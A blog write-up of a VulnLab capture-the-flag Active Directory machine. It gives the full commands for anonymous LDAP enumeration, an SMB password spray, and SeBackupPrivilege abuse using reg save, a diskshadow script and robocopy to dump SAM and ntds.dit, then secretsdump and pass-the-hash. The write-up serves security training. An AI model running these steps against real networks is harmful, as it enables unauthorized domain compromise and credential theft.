---
title: "VulnLab - Baby Writeup"
date: 2023-11-22
categories: ["Security"]
tags: ["CTF", "Writeup", "AD"]
---
![Baby Thumbnail](ctfs/vulnlab/baby/vl-baby.png)

This is a write-up of the Baby machine on [VulnLab](https://www.vulnlab.com/) by xct. This box deals with anonymous LDAP enumeration, and exploitation of the SeBackupPrivilege to exfiltrate and crack user hashes.

## User

Hint: `Look into anonymous LDAP Access.`

I started by performing an nmap scan of the machine, and got the following results:

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-15 01:00:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-11-15T01:01:42+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2023-11-15T01:01:02+00:00
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2023-07-29T07:48:30
|_Not valid after:  2024-01-28T07:48:30
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-15T01:01:04
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

This gives us some helpful information such as the name of the domain and host we're working with (DC=baby,DC=vl), and running services.

### LDAP Enumeration

I utilized nmap to dump information about the domain with `nmap -n -sV --script "ldap* and not brute" -Pn IP`, and ldapsearch to dump the users with `ldapsearch -x -H ldap://IP:389 -b "DC=baby,DC=vl" > ldap-dump.txt` where we found a notable user:

```
# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to REDACTED
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z
displayName: Teresa Bell
uSNCreated: 12889
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12905
name: Teresa Bell
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819812778759642
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Teresa.Bell
sAMAccountType: 805306368
userPrincipalName: Teresa.Bell@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0
```

Teresa Bell had a password in the description for her user (redacted for walkthrough), but trying to connect with EvilWinRM failed due to not having the correct password, I decided to use CrackMapExec to spray these credentials across the other valid users we pulled from LDAP. 

### SMB Password Spray

Before we're able to spray the password we found we need to build a list of valid users, I did this by parsing the LDAP dump to pull out usernames in a format CME can read with `cat ldap-dump.txt | grep userPrincipalName | awk '{print $2}' | cut -d "@" -f 1`:

```
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Caroline.Robinson
Ian.Walker
```

I used CrackMapExec to perform an SMB password spray against those users with `crackmapexec smb IP -u ./users.txt -p PASSWORD --shares`:

![SMB Password Spray](ctfs/vulnlab/baby/cme-smb-passwd-spray.png)

From this, we see that the password works on Caroline Robinson's account, but her password needs to be changed.

### Getting the Flag

Before we can login, we have to change the account's password. I utilized smbpasswd for this using `smbpasswd -r IP -U USER`. Next, we can login using EvilWinRM and get the user flag with `evil-winrm -i IP -u Caroline.Robinson -p PASSWORD`:

![User Flag](ctfs/vulnlab/baby/user-flag.png)

## Root

Hint: `Look at user privileges.`

I started by enumerating the permissions of our Caroline.Robinson user with `whoami /priv`:

![Initial Permissions](ctfs/vulnlab/baby/initial-privs.png)

### SeBackupPrivilege

Of note is the SeBackupPrivilege allows a user to backup any file on a machine, regardless of permissions. This includes things like the sam and system files which we can feed into secretsdump or mimikatz to extract user hashes. I moved into a directory where the user had write permissions and made copies of the sam and system files to download onto my machine with `reg save hklm\sam c:\Temp\sam` and `reg save hklm\system c:\temp\system`, and downloaded them with smbclient.

I then fed the files into mimikatz and got the following hashes:

![Local Hashes](ctfs/vulnlab/baby/local-creds.png)

However, when attempting to pass the Administrator hash to login with `evil-winrm -i IP -u 'administrator' -H 'HASH'`, it doesn't work because these are local accounts as opposed to domain accounts. To get the domain administrator hash that we need to log in, we have to use the SeBackupPrivilege to dump the ntds.dit file which is a database containing AD information including user objects. 

### Getting the Flag

We can make a copy of ntds.dit and dump it using diskshadow and robocopy.

I first created the following script to run with diskshadow, saved as `backup.txt`:

```
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

I ran it with `diskshadow /s backup.txt`, and was able to dump the ntds.dit with `robocopy /b E:\Windows\ntds . ntds.dit`. Feeding those into secretsdump with `impacket-secretsdump -ntds ntds.dit -system system.hive local` we get the domain administrator hash which we can pass to login and get the root flag:

![Root Flag](ctfs/vulnlab/baby/root-flag.png)
